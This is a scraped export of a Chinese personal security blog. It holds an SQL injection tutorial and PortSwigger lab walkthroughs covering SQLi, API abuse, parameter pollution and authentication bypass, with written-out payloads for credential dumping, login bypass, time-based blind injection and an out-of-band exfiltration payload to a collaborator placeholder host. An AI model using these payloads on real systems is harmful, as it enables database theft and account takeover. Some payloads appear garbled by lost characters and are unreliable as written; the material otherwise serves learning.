[{"title":"SQL注入由浅至深解析","path":"/posts/7296191c.html","content":"认识SQL注入一、什么是SQL注入？SQL注入其实是一个组合名词，SQL、注入，想理解SQL注入的含义，就应该先明白SQL是什么？注入是什么？ SQL是什么？SQL是结构化查询语言(Structured Query Language)的简称，一种用于管理和操作关系型数据库的标准语言。通俗的讲，是一种可以在电子表格里进行想要的筛选、操作和管理数据的一种标准语言。 注入是什么？注入（Injection） 在安全领域指的是将恶意代码或数据插入到原本的程序逻辑中，导致意想不到的行为，叫做注入攻击。通俗的讲，想象打针医生给你注射了毒素，导致破坏了你人体系统的平衡。 SQL注入漏洞是什么？知道了什么是SQL，什么是注入，就容易理解SQL注入了。SQL注入漏洞就是通过注入攻击破坏了原有的SQL逻辑，导致攻击者可以实现对数据库的非法操作。 二、SQL注入的经典案例1998年，首个公开披露的SQL注入案例出现在Phrack杂志，攻击者通过拼接单引号突破查询逻辑。 通过一个简单的案例来简单理解SQL注入，下面这张图来自于一个很好的学习资源网站，讲的是网站具有查询产品的类别的功能，可以控制参数，恶意的hacker在原有的数据库逻辑上进行了联合查询，得到了所有的users表的账号和密码。 三、SQL注入的危害简单认识了SQL注入，那么SQL注入到底能形成什么危害？ SQL注入能造成的危害是发散的，例如颠覆逻辑，导致任意用户登录，或是对数据库进行控制，泄露所有信息或者被删库，也可以利用数据库权限植入后门等等等等，需要经过具体情况具体分析，总体来说SQL注入漏洞的危害是非常之高的。 SQL注入基础一、SQL基础二、如何检测SQL注入通常在参数后加一个单引号查找错误和异常，再加入布尔条件and 11 and 12寻找差异，或者时间延迟寻找差异。 三、查找不同位置的SQL注入大多数SQL注入漏洞出现在Where子句后，SQL注入也经常出现再一些不同的位置 update语句 更新的值或者where子句中 insert语句 插入的值中 select语句 表名或者列名中以及order by 语句 发现SQL注入-1and 1=1 and 1=2or 1=1or 1=2+1-1 2/151-ASCII(1) # 这个表达式的值等于267-ASCII(A) # 这个表达式的值等于2 1or a=alike a=a/*!32302 and 1=1*/;\\aaa)--+aaa,2000)--+aaa,2000,2000)--+字段正确就可以成功注入2-sleep(1)1 ASC --1 DESC -- SQL注入的利用联合查询所有数据库都需要判断字段类型，无论是什么数据库，判断字段类型的方法基本相同： 使用 NULL 测试： NULL 可以匹配任何类型。 示例： UNION SELECT NULL, NULL, NULL 逐步替换 NULL： 将 NULL 替换为数字或字符，观察是否报错。 示例： UNION SELECT 1, a, NULL 通过错误信息判断： 如果字段类型不匹配，数据库会返回明确的错误信息。 找到闭合确定了字段数，如何判断是什么数据库呢？1. 观察报错信息如果页面返回错误信息，可以从中提取数据库的类型信息。例如： MySQL: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version MSSQL: Unclosed quotation mark after the character string 或 Incorrect syntax near PostgreSQL: ERROR: syntax error at or near Oracle: ORA-00933: SQL command not properly ended 如果错误信息中包含这些关键字，就能初步判断数据库类型。 2. 通过数据库特定语法测试不同数据库的 SQL 语法有所不同，可以尝试执行特定查询语句来判断数据库类型： 基于 UNION SELECT 语法 MySQL: SELECT 1,2,3 UNION SELECT @@version, user(), database(); MSSQL: SELECT 1,2,3 UNION SELECT @@version, SYSTEM_USER, DB_NAME(); PostgreSQL: SELECT 1,2,3 UNION SELECT version(), current_user, current_database(); Oracle: SELECT 1,2,3 FROM dual UNION SELECT banner, user, ora_database_name FROM v$version; 如果某个查询执行成功或返回版本信息，则可确定数据库类型。 3. 观察注释风格不同数据库支持的 SQL 注释方式不同，可以利用这一特性： MySQL: -- （两个 - 后加一个空格） 或 # MSSQL: --（两个 -，不需要空格） 或 /* ... */ PostgreSQL: -- （两个 - 后加空格） 或 /* ... */ Oracle: -- （两个 - 后加空格） 或 /* ... */ 你可以在 SQL 注入测试时尝试不同的注释方式，看哪种不会报错，从而判断数据库类型。 4. 通过 ORDER BY 测试数据类型不同数据库对 ORDER BY 处理方式不同： MySQL PostgreSQL: 可以使用列的索引（如 ORDER BY 1） MSSQL: 可能对 ORDER BY 1 报错，但 ORDER BY column_name 可用 Oracle: ORDER BY 1 可能报错，需使用 ORDER BY column_name 如果 ORDER BY 1 报错，而 ORDER BY column_name 可用，可能是 MSSQL 或 Oracle。 5. 利用时钟延迟测试（盲注）不同数据库有不同的延迟查询方法： MySQL: SELECT SLEEP(5); MSSQL: WAITFOR DELAY 00:00:05; PostgreSQL: SELECT pg_sleep(5); Oracle: dbms_pipe.receive_message(A,5); 如果某个查询执行后页面延迟响应，就可以确认数据库类型。 6. 观察默认数据库表不同数据库有自己的系统表，可以通过 SQL 语句查看： MySQL: SELECT * FROM information_schema.tables; MSSQL: SELECT * FROM sys.tables; PostgreSQL: SELECT * FROM pg_catalog.pg_tables; Oracle: SELECT * FROM all_tables; 如果查询某个表成功，则可确认数据库类型。 7. 观察数据函数不同数据库提供的函数不同，可以利用这一点： 数据库 版本查询函数 用户查询函数 数据库查询函数 MySQL @@version user() database() MSSQL @@version SYSTEM_USER DB_NAME() PostgreSQL version() current_user current_database() Oracle banner (v$version) user ora_database_name 可以通过 SELECT 语句调用这些函数，返回值即可判断数据库类型。 SQL注入的绕过SQL注入的防御参考文章：https://mp.weixin.qq.com/s/l2Bt9jv-96HapqxYfeju2w?scene=25#wechat_redirect SQL注入靶场Lab1Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data step: 加单引号，发现异常 Gifts’ or 11–+（因为 1=1 是一个恒真条件，导致整个 WHERE 条件永远为真。数据库不会过滤任何行，而是返回表中的所有数据。） Gifts’ or 12–+ （如果 id = 1 为真，那么整个条件为真，该行会被选中。如果 id = 1 为假，那么由于 1=2 也为假，整个条件为假，该行不会被选中。最终，数据库只会返回 id = 1 的行。） Lab2Lab:SQL injection vulnerability allowing login bypass https://portswigger.net/web-security/sql-injection/lab-login-bypass step: 账号administrator’– 密码随便输入（猜想where username’administrator’ and password’123456’ –+） Lab3Lab: SQL injection attack, querying the database type and version on Oracle https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle step: Accessories’ or 11–+，Accessories’ or 12–+ 找到闭合 Accessories’ order by 2–+，Accessories’ order by 3–+ 只有两个字段 找到闭合确定了字段数，如何判断是什么数据库呢？见SQL注入利用篇 ‘ and 11 UNION SELECT ‘a’,banner FROM v$version–+ Lab4Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft step: Gifts’ or 11–+，Gifts’ or 12–+ 找到闭合 order by 判断字段后 联合查询 Gifts’ union select 1,version()–+ Lab5Lab: SQL injection attack, listing the database contents on non-Oracle databases https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle step: 闭合判断字段后，进行联合查询Gifts’ union select null,null–+ Gifts’ union select null,database()–+ 显示错误，尝试其它的数据库，Gifts’ union select null,current_database()–+，确定为psotgreSQL Gifts’+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables– 找到users表 Gifts’+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name’users_imbvkh’– 查字段名 找到了username字段、password字段 Gifts’+UNION+SELECT+username_xltqyz,+password_wnxhyl+FROM+users_imbvkh–，然后登陆账号即可。 information_schema.tables 是 MySQL 和其他关系型数据库（如 PostgreSQL、SQL Server）中的一个系统视图，用于存储数据库中所有表的信息。可以自己在数据库中尝试查看该表的数据去了解该表。 Lab6Lab: SQL injection attack, listing the database contents on Oracle https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle step: Pets’ or 11– Pets’ or 12– 找到闭合 order by 判断字段 Pets’ union select null,null from dual–+ Pets’ and 12 union select null,table_name from all_tables – 找到用户名表 USERS_ZDWAIY Gifts’+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name’USERS_ZDWAIY’– PASSWORD_TUKOGZ USERNAME_GHFJOM 找到列名 Gifts’+UNION+SELECT+USERNAME_GHFJOM,+PASSWORD_TUKOGZ+FROM+USERS_ZDWAIY– 得到账号密码 并登录 Lab7Lab: SQL injection UNION attack, determining the number of columns returned by the query https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns step: 找到闭合 order by判断字段数 ‘union select null,null,null– Lab8Lab: SQL injection UNION attack, finding a column containing text https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text step: ​\tPets’union select null,’giMbRU’,null–+ Lab9Lab: SQL injection UNION attack, retrieving data from other tables https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables step: Gifts’ union select username,password from users–+ Lab10Lab: SQL injection UNION attack, retrieving multiple values in a single column https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column step: 找到闭合判断列数 Tech+gifts’ union select null,concat(username,’~’,password) from users–+ 使用concat进行在一个字段中检索多个值。 也可以使用字符串连接运算符 Tech+gifts’ UNION+SELECT+NULL,username||’~’||password+FROM+users–（||（双竖线）：用于连接字符串，在 PostgreSQL、Oracle、SQLite 以及部分 SQL 方言中有效。） administrator~vkltzrpvfk54pvgozg2w Lab11Lab: Blind SQL injection with conditional responses https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses step: TrackingIdFDMzoanbTIDaYkYV’and 11–; TrackingIdFDMzoanbTIDaYkYV’and 12–; 发现welcome back会消失 TrackingIdFDMzoanbTIDaYkYV’ order by 1–; 并发现无法进行联合查询注入 利用子查询进行布尔注入 Lab12Lab: Blind SQL injection with conditional errors https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors step: oracle盲注 Lab13Lab: Visible error-based SQL injection https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based step: ‘ AND CAST((SELECT 1) AS int)– CAST()数据类型转换 函数 ‘ AND 1CAST((SELECT 1) AS int)– ‘ AND 1CAST((SELECT username FROM users) AS int)– ‘AND 1CAST((SELECT username FROM users limit 1) AS int)– Lab14Lab: Blind SQL injection with time delays https://portswigger.net/web-security/sql-injection/blind/lab-time-delays Lab15Lab: Blind SQL injection with time delays and information retrieval https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval lab16Lab: Blind SQL injection with out-of-band interaction https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band step: TrackingIdx’+UNION+SELECT+EXTRACTVALUE(xmltype(‘%3fxml+version%3d”1.0”+encoding%3d”UTF-8”%3f!DOCTYPE+root+[+!ENTITY+%25+remote+SYSTEM+”http%3a‘||(SELECT+password+FROM+users+WHERE+username%3d’administrator’)||’.BURP-COLLABORATOR-SUBDOMAIN“+%25remote%3b]’),’l’)+FROM+dual– 结合 SQL 注入 和 XXE 进行 OOB 数据泄露，适用于 Oracle 数据库。 Lab17Lab: Blind SQL injection with out-of-band data exfiltration https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration ‘+UNION+SELECT+EXTRACTVALUE(xmltype(‘%3fxml+version%3d”1.0”+encoding%3d”UTF-8”%3f!DOCTYPE+root+[+!ENTITY+%25+remote+SYSTEM+”http%3a‘||(SELECT+password+FROM+users+WHERE+username%3d’administrator’)||’.BURP-COLLABORATOR-SUBDOMAIN“+%25remote%3b]’),’l’)+FROM+dual– 结合 SQL 注入 和 XXE 进行 OOB 数据泄露，适用于 Oracle 数据库。发送http请求。 Lab18Lab: SQL injection with filter bypass via XML encoding https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding step1: 1+1 发现产生了响应 进行or 11 发现被waf拦截了 使用hackvertor进行encode hex_entities编码进行bypass 进行判断字段，最后得到密码 1 UNION SELECT username || ‘~’ || password FROM users","tags":["SQL injection"]},{"title":"Hello World","path":"/posts/4a17b156.html","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post$ hexo new My New Post More info: Writing Run server$ hexo server More info: Server Generate static files$ hexo generate More info: Generating Deploy to remote sites$ hexo deploy More info: Deployment"},{"title":"About Me","path":"/about/index.html","content":"👋 Hi, I’m M3ng9e 👀 I’m interested in Cyberspace Security. 📫 Web Dog 🌱 凌驭空间·OverSpace 🏠 Blog：https://m3ng9e.github.io/ 💭 Mamba Mentality 🆒王权之势寻苍穹，萌蘖向阳成参天。 🎸音乐游戏影视~📀 O1 2025年的小目标：完成 Volantis 6.0 并发布上线 来自2025年的复盘：已《基本》实现目标 正常 44% KR1 重构 tag-plugins 和 wiki 系统 当 KR 进度为 100% 时，标签默认显示为 已完成当 KR 未设置进度时，默认为 0%当 O 未设置进度时，则显示所有 KR 进度平均值 已完成 100% KR2 完成主要页面设计稿 小提示1小提示2您可以在 _config.yml 文件中修改标签的颜色和文案您可以在 _config.yml 文件中增加任意的标签配置 延期 90% KR3 完成前置准备工作（如果你知道答案，请在留言区帮帮我！🥹） 在咸水和海滩之间找一亩地求出圆周率后15位找出宇宙的终极逻辑去地狱里走两步 未完成 -12% KR-4 开发、测试和发布 支持嵌套插入图片等其它简单组件 风险 0%"},{"title":"友链","path":"/friends/index.html","content":"aaa"},{"title":"API测试","path":"/wiki/WebSec/API测试.html","content":"API安全测试API基础文章：https://aws.amazon.com/what-is/api/ API文章 - GraphQL与RESTful：WebAPI时代的攻击面 - 先知社区 文章 - API安全学习笔记 - 先知社区 OWASPcrAPI: completely ridiculous API (crAPI) 漏洞挖掘1、发现API （api文档、递归爆破），查找隐藏的API，隐藏的参数。 2、支持的不同的HTTP请求方法 http verbs可以爆破。 大规模分配漏洞大规模分配（也称为自动绑定）可以无意间创建隐藏的参数。当软件框架自动将请求参数绑定到内部对象上的字段时，就会发生。因此，大规模分配可能会导致应用程序支持参数，这些参数从未打算由开发人员处理。 预防API中的漏洞Burp靶场lab1Lab: Exploiting an API endpoint using documentation step: 修改邮箱，发现了PATCH apiuserwiener可疑的接口 尝试找到api文档，GET api HTTP2，找到API文档，进行删除DELETE apiusercarlos。 总结：每个功能点都进行尝试，找到可疑的接口数据包，进行进一步分析。 lab2Lab: Finding and exploiting an unused API endpoint step: 对GET apiproducts1price 进行测试所支持的请求方法 发现其支持PATCH，根据提示，只支持JSON格式。 修改content-type: applicationjson，并添加一个空的json请求体。 根据提示构造参数，完成价格修改。回到购买页面，购买商品。 总结：对于可疑API可以进行测试所支持的请求方法，再根据提示构造参数。 lab3Testing mass assignment vulnerabilities测试大规模分配漏洞（自动绑定漏洞） Lab: Exploiting a mass assignment vulnerability https://portswigger.net/web-security/api-testing/lab-exploiting-mass-assignment-vulnerability step: 进行买夹克，发现最最后的接口是apicheck 在GET请求中，对比POST请求多了一个参数，添加进行，修改值为x，发现参数被接收，修改百分比为100，导致价格为0。成功购买商品。 {“chosen_discount”:{“percentage”:100},”chosen_products”:[{“product_id”:”1”,”quantity”:1}]} 总结：对于API的不同请求方法的响应包，请求包参数需要敏感一些，尝试添加在请求中，更改数值查看响应，若参数被接收，那么就基本存在自动绑定漏洞的。"},{"title":"参数污染","path":"/wiki/WebSec/服务器端参数污染.html","content":"参数污染测试于查询字符串中截断的字符串GET /userSearch?name=peter%23fooback=/home前端将尝试访问以下URL：GET /users/search?name=peter#foopublicProfile=true如果响应返回用户彼得，则服务器端查询可能已被截断。如果返回了无效的名称错误消息，则该应用程序可能已将FOO视为用户名的一部分。这表明服务器端请求可能没有被截断。如果您能够截断服务器端请求，则可以删除将公共填写字段设置为true的要求。您也许可以利用此功能返回非公开用户配置文件。 注射无效的参数GET /userSearch?name=peter%26foo=xyzback=/home服务器请求：GET /users/search?name=peterfoo=xyzpublicProfile=true如果响应不变，则可能表明该参数已成功注入但被应用程序忽略。接下来可以尝试注入有效参数 注入有效参数GET /userSearch?name=peter%26email=fooback=/home服务器请求：GET /users/search?name=peteremail=foopublicProfile=true查看有关如何解析其他参数的响应。 覆盖现有参数GET /userSearch?name=peter%26name=carlosback=/home服务器请求：GET /userSearch?name=peter%26name=carlosback=/home取决于应用程序如何处理第二个参数。这在不同的Web技术方面有所不同。 PHP仅解析最后一个参数。ASP.NET结合了两个参数。Node.js Express仅解析第一个参数。如果能够覆盖原始参数，则可以进行利用。例如，您可以将nameadministrator添加到请求中。这可能使您可以作为管理员用户登录。 REST API 参数污染RESTFUL API可以将参数名称和值放在URL路径中，而不是查询字符串。 GET /edit_profile.php?name=peter === GET /api/private/users/peterURL编码的Peter/../admin提交为名称参数的值GET /edit_profile.php?name=peter%2f..%2fadminGET /api/private/users/peter/../admin如果后端解析，则传递的是/api/private/users/admin lab1Lab: Exploiting server-side parameter pollution in a query string 实验室：在查询字符串中利用服务器端参数污染 step: 先加参数xy 查看响应是否正常，在测试改参数 usernameadministrator%23 提示说有字段未定义 usernameadministrator%26fieldx%23 （fieldx#） type:ClientError,code:400,error:Invalid field. 对field参数进行爆破，并从JS文件中获取到参数reset_token。 csrf=4j30Rmm6kJOhwVYqRJijmyaClFzA6U1cusername=administrator%26field=reset_token%23返回结果result:ayvnw3dojloxcu0sbwzny9xcrkrfddhh,type:reset_token 使用token链接 https://0af4007c03f5116381c7a416008600f6.web-security-academy.net/forgot-password?reset_token=6hb0y08pxxdvfhfdmisufi51njr3fbhu 总结：利用参数污染传递参数，首先xy，使用截断报错获取到缺乏一个字段，再判断能否%26fieldx%23传递另一个参数。 lab2Lab: Exploiting server-side parameter pollution in a REST URL step: usernameadministrator# usernameadministrator? 都显示无效路由 username.administrator 正常响应了请求 ..无效路由 type:email,result:*****@normal-user.net username........administrator 一直增加 error: Unexpected response from API server: html head meta charset=\\UTF-8\\ titleNot Found\\/title \\/head body h1Not found\\/h1 pThe URL that you requested was not found.\\/p \\/body \\/html 返回未找到的响应。这表明您已经在API根部导航。 ........openapi.json%23 error: Unexpected response from API server: \\openapi\\: \\3.0.0\\, \\info\\: \\title\\: \\User API\\, \\version\\: \\2.0.0\\ , \\paths\\: \\/api/internal/v1/users/username/field/field\\: \\get\\: \\tags\\: [ \\users\\ ], \\summary\\: \\Find user by username\\, \\description\\: \\API Version 1\\, \\parameters\\: [ ame\\: \\username\\, \\in\\: \\path\\, \\description\\: \\Username\\, \\required\\: true, \\schema\\: ...返回了一条API/api/internal/v1/user/username/field/field administrator/field/email%23 响应正常 administrator/field/passwordResetToken%23 不支持 可能是版本不行 ../../v1/users/administrator/field/passwordResetToken%23 成功了返回了token 利用token重置密码，成功！"},{"title":"身份验证","path":"/wiki/WebSec/身份验证.html","content":"身份验证漏洞的类型有两种： 暴力破解 逻辑 lab1Lab: Username enumeration via different responses 用户名枚举 step: 提示无效的用户名，固定爆破用户名 爆破出用户名，固定爆破密码 Lab2Lab: 2FA simple Bypass 双因素认证Bypass 条件 ​\tA账户:账号密码 认证码 ​\tB账户:账号密码 无认证码 step: 登录A账号，记录登陆后的URL 在B账号登录到2FA认证码的时候，进行输入登陆后的URL，成功登录。 Lab3Lab: Password reset broken logic 条件 ​\tA账户：账号密码 邮箱 ​\tB账号：账号 step: 使用A账户忘记密码，生成找回密码链接，https://0a1e000404ca580a8cd0625e001b0021.web-security-academy.net/forgot-password?temp-forgot-password-token=qkhxsmxyksqfcmxsuuogatkvodrkyhsu 使用临时token进行修改密码 研究提交修改密码请求发现post数据包有用户名参数，修改为carlos，成功重置。 Lab4Lab: Username enumeration via subtly different responses 通过微妙的响应列举用户名 step： 可以爆破，无提示明显，固定用户名进行爆破，进行grep提取响应，发现有细微区别，再爆破密码，成功。 Lab5Lab: Username enumeration via response timing step: 1. 限制请求次数，使用x-forwded-for 1. 将密码设置为很长的字符串，用户名正确就会校验密码，时间会很长。爆破出密码 Lab6Lab: Broken brute-force protection, IP block 利用正确的密码 进行Bypass请求错误次数"}]